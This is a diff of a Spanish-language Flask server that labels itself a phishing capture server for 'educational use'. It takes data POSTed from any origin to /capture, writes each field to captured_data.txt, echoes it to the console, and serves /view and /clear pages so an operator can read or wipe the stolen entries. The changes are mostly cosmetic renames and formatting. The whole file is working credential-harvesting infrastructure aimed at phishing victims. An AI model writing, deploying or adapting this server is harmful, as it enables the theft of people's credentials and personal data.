@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+
 from flask import Flask, request, jsonify
 from datetime import datetime
 import json
@@ -6,17 +6,16 @@ import os
 
 app = Flask(__name__)
 
-# Archivo donde se guardan los datos
-LOG_FILE = "captured_data.txt"
 
-# Asegurar que el archivo existe
-if not os.path.exists(LOG_FILE):
-    with open(LOG_FILE, 'w') as f:
-        f.write("=== LOG DE CAPTURAS ===\n")
-        f.write(f"Iniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        f.write("=" * 50 + "\n\n")
+log_f = "captured_data.txt"
 
-# ✅ CONFIGURACIÓN CORS: Permitir peticiones desde cualquier origen
+if not os.path.exists(log_f):
+    with open(log_f, 'w') as f:
+        f.write("=== LOG DE CAPTURAS ===")
+        f.write(f"Iniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        f.write("=" * 50 + " ")
+
+#permitir peticiones de cualquier origen
 @app.after_request
 def after_request(response):
     response.headers.add('Access-Control-Allow-Origin', '*')
@@ -28,7 +27,7 @@ def after_request(response):
 @app.route('/')
 def index():
     return '''
-    <h2>🕵️ Servidor de Captura Activo</h2>
+    <h2> Servidor de Captura Activo</h2>
     <p>Esperando datos de la víctima...</p>
     <p><strong>Archivo de log:</strong> captured_data.txt</p>
     <p><a href="/view">Ver datos capturados</a></p>
@@ -38,7 +37,7 @@ def index():
 @app.route('/view')
 def view():
     try:
-        with open(LOG_FILE, 'r') as f:
+        with open(log_f, 'r') as f:
             content = f.read()
         return f'<pre style="background:#1e1e1e;color:#d4d4d4;padding:20px;border-radius:10px;font-size:14px;max-height:80vh;overflow:auto;">{content}</pre>'
     except:
@@ -46,19 +45,19 @@ def view():
 
 @app.route('/clear')
 def clear():
-    with open(LOG_FILE, 'w') as f:
-        f.write("=== LOG REINICIADO ===\n")
+    with open(log_f, 'w') as f:
+        f.write("LOG REINICIADO ")
         f.write(f"Reiniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        f.write("=" * 50 + "\n\n")
+        f.write("=" * 50 + " ")
     return "Datos limpiados. <a href='/'>Volver</a>"
 
 @app.route('/capture', methods=['OPTIONS', 'POST'])
 def capture():
-    # ✅ Manejar petición OPTIONS (pre-flight)
+    # manejo peticio OPTIONS
     if request.method == 'OPTIONS':
         return '', 200
     
-    # ✅ Procesar POST
+    # process post
     try:
         # Obtener los datos (JSON)
         data = request.get_json()
@@ -66,19 +65,19 @@ def capture():
         if not data:
             return jsonify({"error": "No se recibieron datos"}), 400
         
-        # Añadir timestamp
+        # añadir timestamp
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        # Guardar en archivo
-        with open(LOG_FILE, 'a') as f:
-            f.write(f"\n[{timestamp}] NUEVA CAPTURA\n")
+        # log de utilidad
+        with open(log_f, 'a') as f:
+            f.write(f"[{timestamp}] NUEVA CAPTURA")
             f.write("-" * 40 + "\n")
             for key, value in data.items():
-                f.write(f"{key}: {value}\n")
+                f.write(f"{key}: {value}")
             f.write("-" * 40 + "\n")
         
-        # Mostrar en consola
-        print(f"\n[{timestamp}] 📥 DATOS CAPTURADOS:")
+        # show
+        print(f"\n[{timestamp}] DATOS CAPTURADOS:")
         for key, value in data.items():
             print(f"  {key}: {value}")
         print("-" * 40)
@@ -96,7 +95,7 @@ if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════╗
     ║   🕵️ SERVIDOR DE CAPTURA DE PHISHING         ║
-    ║   USO EDUCATIVO  -  SPCZINMAKER            ║
+    ║   USO EDUCATIVO  -  SPCZINMAKER mvrmx            ║
     ║                                               ║
     ║   Servidor corriendo en: http://0.0.0.0:8081  ║
     ║   Endpoint de captura: /capture               ║
